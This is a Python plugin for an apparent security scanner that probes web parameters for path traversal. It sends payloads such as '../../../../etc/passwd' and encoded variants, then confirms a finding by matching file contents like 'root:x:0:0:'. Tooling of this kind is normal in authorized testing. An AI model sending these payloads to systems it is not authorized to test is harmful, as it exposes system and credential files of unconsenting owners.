#!/usr/bin/env python3
"""Evidence-oriented Path Traversal detector for authorized targets."""
import re
from typing import Dict
from core.context import Context
from plugins._request_helpers import request_param

TRAVERSAL_PAYLOADS = [
    '../../../../etc/passwd',
    '..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
    '....//....//....//etc/passwd',
    '..%2f..%2f..%2f..%2fetc%2fpasswd',
    '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
]
TRAVERSAL_PATTERNS = [
    re.compile(r'^root:x:0:0:', re.I | re.M),
    re.compile(r'127\.0\.0\.1\s+localhost', re.I),
    re.compile(r'^\s*\[drivers\]\s*$', re.I | re.M),
    re.compile(r'# Copyright.*Microsoft', re.I),
]


def run(ctx: Context) -> Dict:
    target = ctx.target
    findings = []
    params = ctx.get('discovered_params', []) or [
        {'url': target, 'param': 'file', 'method': 'GET'},
        {'url': target, 'param': 'path', 'method': 'GET'},
        {'url': target, 'param': 'dir', 'method': 'GET'},
        {'url': target, 'param': 'folder', 'method': 'GET'},
        {'url': target, 'param': 'template', 'method': 'GET'},
    ]
    ctx.log('info', f'Analizando Path Traversal en {target}')
    for info in params[:12]:
        if ctx.stopped:
            break
        param = str(info.get('param') or '')
        if not param:
            continue
        try:
            baseline = request_param(ctx, info, str(info.get('baseline_value') or 'test'), timeout=8)
            baseline_text = getattr(baseline, 'text', '') or ''
        except Exception:
            baseline_text = ''
        for payload in TRAVERSAL_PAYLOADS:
            if ctx.stopped:
                break
            try:
                resp = request_param(ctx, info, payload, timeout=8)
                text = getattr(resp, 'text', '') or ''
                match = next((p for p in TRAVERSAL_PATTERNS if p.search(text) and not p.search(baseline_text)), None)
                if not match:
                    continue
                confirm = request_param(ctx, info, payload, timeout=8)
                confirm_text = getattr(confirm, 'text', '') or ''
                if not match.search(confirm_text):
                    continue
                url = getattr(resp, 'url', None) or info.get('url', target)
                findings.append({
                    'type': 'path_traversal', 'severity': 'high', 'title': 'Path Traversal',
                    'detail': f'Contenido de archivo del sistema reproducible mediante el parámetro "{param}".',
                    'confidence': 0.99,
                    'evidence': {
                        'url': str(url), 'parameter': param, 'method': str(info.get('method', 'GET')).upper(),
                        'payload': payload, 'matched': match.pattern, 'reproduced': True,
                    },
                    'url': str(url), 'parameter': param, 'payload': payload,
                })
                ctx.log('ok', f'Path Traversal confirmado en {param}')
                break
            except (TimeoutError, ConnectionError, RuntimeError) as exc:
                ctx.log('debug', f'Traversal {param}: {exc}')
            except Exception as exc:
                ctx.log('warn', f'Traversal {param}: {exc}')
    return {'findings': findings}

__version__ = '2.0.0'; __author__ = 'HT Team'; PHASE = 'attack'; REQUIRES = ['crawler']
